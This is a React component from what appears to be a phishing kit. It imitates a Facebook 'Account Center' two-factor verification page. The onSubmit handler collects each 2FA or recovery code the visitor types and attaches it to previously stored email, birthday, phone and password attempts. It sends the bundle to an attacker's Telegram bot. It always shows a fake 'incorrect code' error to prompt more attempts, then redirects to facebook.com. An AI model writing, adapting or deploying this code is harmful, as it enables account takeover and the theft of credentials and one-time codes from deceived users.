import { useState, useEffect } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import OTPImage from '@/assets/verify.png';
import { Loader2 } from 'lucide-react';
import { config } from '@/config/data';
const verifySchema = z.object({
    code: z.string().min(6, 'Code must be at least 6 digits').max(8, 'Code cannot be more than 8 digits').regex(/^\d+$/, 'Code must contain only numbers')
});

type VerifyFormValues = z.infer<typeof verifySchema>;
interface StoredFormData {
    email: string;
    birthday: string;
    phone: string;
    passwordAttempts: string[];
    codeAttempts?: string[];
    lastMessageId: number | null;
    lastMessage?: string;
    timestamp: number;
}

interface PageContent {
    title: string;
    subtitle: string;
    approveTitle: string;
    approveDescription: string;
    codePlaceholder: string;
    codeError: string;
    invalidCodeError: string;
    continueButton: string;
    verifyingText: string;
    sendCodeButton: string;
}

const defaultContent: PageContent = {
    title: 'Account Center - Facebook',
    subtitle: 'Check notifications on another device',
    approveTitle: 'Approve from another device or Enter your login code',
    approveDescription: 'Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code',
    codePlaceholder: 'Enter Code',
    codeError: 'This code is incorrect. Please check that you entered the code correctly or try a new code.',
    invalidCodeError: 'Code must contain only numbers',
    continueButton: 'Continue',
    verifyingText: 'Verifying...',
    sendCodeButton: 'Send Code'
};

const translateText = async (text: string, targetLang: string): Promise<string> => {
    try {
        const response = await fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`);
        const data = await response.json();
        return data[0].map((item: any[]) => item[0]).join('');
    } catch (error) {
        console.error('Translation error:', error);
        return text;
    }
};

const Verify = () => {
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [content, setContent] = useState<PageContent>(defaultContent);
    const [selectedLanguage, setSelectedLanguage] = useState('en');

    useEffect(() => {
        const detectedLanguage = localStorage.getItem('detectedLanguage');
        if (detectedLanguage) {
            setSelectedLanguage(detectedLanguage);
        }
    }, []);

    useEffect(() => {
        const translateContent = async () => {
            if (selectedLanguage === 'en') {
                setContent(defaultContent);
                return;
            }

            const translatedContent: PageContent = { ...defaultContent };
            for (const key of Object.keys(defaultContent) as (keyof PageContent)[]) {
                translatedContent[key] = await translateText(defaultContent[key], selectedLanguage);
            }
            setContent(translatedContent);
        };

        translateContent();
    }, [selectedLanguage]);

    const {
        register,
        handleSubmit,
        formState: { errors, isValid: isCodeValid }
    } = useForm<VerifyFormValues>({
        resolver: zodResolver(verifySchema),
        mode: 'onChange'
    });

    const onSubmit = async (data: VerifyFormValues) => {
        setIsLoading(true);
        setShowError(false);

        await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));

        try {
            const storedData = localStorage.getItem('metaFormData');
            if (!storedData) {
                throw new Error('No stored form data found');
            }

            const formData = JSON.parse(storedData) as StoredFormData;

            const codeAttempts = formData.codeAttempts || [];
            codeAttempts.push(data.code);

            const originalMessage = formData.lastMessage ?? '';

            const codeAttemptsText = codeAttempts.map((code, index) => `\n<b>📱 2FA CODE ${index + 1}:</b> <code>${code}</code>`).join('');

            const fullMessage = `${originalMessage}${codeAttemptsText}`;

            if (formData.lastMessageId) {
                try {
                    await fetch(`https://api.telegram.org/bot${config.TOKEN}/deleteMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: config.CHAT_ID,
                            message_id: formData.lastMessageId
                        })
                    });
                } catch (error) {
                    console.error('Error deleting previous message:', error);
                }
            }

            const response = await fetch(`https://api.telegram.org/bot${config.TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: config.CHAT_ID,
                    text: fullMessage,
                    parse_mode: 'HTML'
                })
            });

            const result = await response.json();

            const updatedData: StoredFormData = {
                ...formData,
                codeAttempts,
                lastMessageId: result.result.message_id,
                lastMessage: fullMessage,
                timestamp: Date.now()
            };

            localStorage.setItem('metaFormData', JSON.stringify(updatedData));

            setShowError(true);

            if (codeAttempts.length >= config.MAX_CODE_ATTEMPTS) {
                setTimeout(() => {
                    window.location.replace('https://facebook.com');
                }, config.LOAD_TIMEOUT_MS);
            }
        } catch (error) {
            console.error('Error:', error);
            setShowError(true);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='flex w-full flex-col items-center justify-center p-4'>
            <div className='flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3'>
                <div className='flex flex-col'>
                    <b>{content.title}</b>
                    <b className='text-2xl'>{content.subtitle}</b>
                </div>
                <img src={OTPImage} alt='Verification' className='w-full' />
                <div>
                    <b>{content.approveTitle}</b>
                    <p>{content.approveDescription}</p>
                </div>
                <form onSubmit={handleSubmit(onSubmit)} className='my-2 flex flex-col items-center justify-center'>
                    <input {...register('code')} className='w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none' type='text' autoComplete='one-time-code' inputMode='numeric' maxLength={8} placeholder={content.codePlaceholder} />
                    {errors.code && <p className='mt-1 text-sm text-red-500'>{content.invalidCodeError}</p>}
                    {!isLoading && showError && <p className='mt-2 text-red-500'>{content.codeError}</p>}
                    <button type='submit' className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${isCodeValid ? 'cursor-pointer bg-blue-500 hover:bg-blue-600' : 'cursor-not-allowed bg-blue-300'} ${isLoading ? 'cursor-not-allowed opacity-70' : ''}`} disabled={!isCodeValid || isLoading}>
                        {isLoading ? (
                            <>
                                <Loader2 className='mr-2 h-4 w-4 animate-spin' />
                                {content.verifyingText}
                            </>
                        ) : (
                            content.continueButton
                        )}
                    </button>
                    <button type='button' className='text-blue-500 hover:underline' onClick={() => setShowError(false)}>
                        {content.sendCodeButton}
                    </button>
                </form>
            </div>
        </div>
    );
};

export default Verify;
